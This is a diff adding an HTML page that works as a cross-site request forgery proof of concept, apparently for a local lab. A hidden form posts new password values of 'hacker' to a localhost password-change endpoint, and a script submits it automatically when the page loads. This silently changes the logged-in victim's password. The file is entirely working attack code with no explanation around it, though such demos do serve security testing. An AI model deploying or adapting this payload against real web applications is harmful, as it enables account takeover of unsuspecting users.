@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+    <form action="http://localhost:8080/password" method="post" id="form">
+        <input type="password" name="password" value="hacker" hidden>
+        <input type="password" name="password_confirm" value="hacker" hidden>
+
+        <button type="submit" class="btn btn-primary" hidden>Submit</button>
+    </form>
+    <script>
+        document.getElementById("form").submit();
+    </script>
+</body>
+</html>
